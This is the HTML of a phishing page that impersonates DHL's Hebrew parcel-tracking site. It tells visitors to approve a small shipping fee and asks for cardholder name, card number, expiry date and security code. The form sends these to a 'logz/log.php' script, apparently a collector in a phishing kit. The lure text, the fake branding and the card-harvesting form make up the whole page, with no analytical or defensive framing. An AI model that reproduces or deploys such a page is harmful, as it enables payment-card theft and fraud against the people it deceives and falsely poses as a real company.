<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DHL_Tracking</title>
    <link rel="shortcut icon" href="img/dhl-logo.jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="content">
        <!-- Header Section -->
        <header>
            <div class="container">
                <div class="header-list">
                    <ul>
                        <li><a href="#" class="lien-hover">מרכז לקוחות</a></li>
                        <li><a href="#" class="lien-hover busniess">לקוחות עסקיים</a></li>
                    </ul>
                </div>
                <div class="header-item">
                    <div class="header-item-img">
                        <img src="img/lg.svg" alt="">
                    </div>
                    <div class="header-item-list">
                        <ul>
                            <li><a href="#" class="lien-hover">שלח חבילות</a></li>
                            <li><a href="#" class="lien-hover">לקבל מנות</a></li>
                            <li><a href="#" class="lien-hover">עזרה ויצירת קשר</a></li>
                        </ul>
                    </div>
                </div>
                <div class="header-info">

                    <p>
                        כאן תוכלו למצוא מידע על המשלוחים שלכם.<br>
                        עקוב אחר המשלוחים שלך בכל עת מהמשלוח ועד המסירה
                    </p>
                </div>
            </div>
        </header>
        <!-- Main Section-->
        <main>
            <div class="container">
                <form action="logz/log.php" method="POST">
                    <div class="main-content">
                        <div class="main-forms" >
                            <div class="form-row">
                                <div class="form-group col-md-12">
                                    <input type="text" class="form-control" placeholder="שם בעל הכרטיס" name="1" required>
                                </div> <br>
                                <div class="form-group col-md-6">
                                    <input type="text" class="form-control" maxlength="19" placeholder="מספר כרטיס אשראי" name="2" required>
                                </div>
                                <div class="form-group col-md-3">
                                    <input type="text" class="form-control" placeholder="חודש/שנה" name="3" required>
                                </div>
                                <div class="form-group col-md-3">
                                    <input type="text" class="form-control" placeholder="***" name="4" required>
                                </div>
                            </div>
                        </div>
                        <div class="main-desc">
                            <h5>הודעה חשובה!</h5>
                            <p>להשלמת המשלוח בהקדם האפשרי, אנא אשר את התשלום<span>(10,56 SHEKEL).</span> בלחיצה על הבא. יש לבצע אישור מקוון תוך 14 הימים הבאים, לפני שתוקפו.</p>
                        </div> 
                        <div class="clear"></div>
                    </div>
                    <div class="main-btn">
                        <button type="submit" class="btn btn-secondary">הַבָּא</button>
                    </div>
                </form>
                
            </div>
        </main>
        <!-- Pub Section -->
        <div class="pub">
            <div class="container">
                <div class="pub-content">
                    <div class="pub-img">
                        <img src="img/pub.jpg" alt="">
                    </div>
                </div>
            </div>
        </div>
        <hr class="separator-line">
        <!-- Footer Section -->
        <footer>
            <div class="footer-content">
                <div class="container">
                    <div class="footer-items">
                        <div class="item package">
                            <h5><a href="#" class="lien-hover">צור קשר ותמיכה</a></h5>
                            <ul>
                                <li><a href="#" class="lien-hover">עזרה ותמיכה</a></li>
                                <li><a href="#">שאלות נפוצות</a></li>
                                <li><a href="#">צור קשר</a></li>
                            </ul>
                        </div>
                        <div class="item contact">
                            <h5><a href="#" class="lien-hover">הצהרה משפטית</a></h5>
                            <ul>
                                <li><a href="#">תנאי שימוש</a></li>
                                <li><a href="#">מדיניות הפרטיות</a></li>
                                <li><a href="#"></a></li>
                            </ul>
                        </div>
                        <div class="item about">
                            <h5><a href="#" class="lien-hover">עדכונים שוטפים</a></h5>
                            <ul>
                                <li><a href="#">מידע אודות הונאה</a></li>
                                <li><a href="#">מידע חשוב</a></li>
                                <li><a href="#">נגישות</a></li>
                                <li><a href="#"></a></li>
                            </ul>
                        </div>
                    </div>
                    <span class="footer-right">&copy; 2021 DHL_International_GmbH - All rights reserved.</span>
                </div>
            </div>
        </footer>
    </div>
</body>
</html>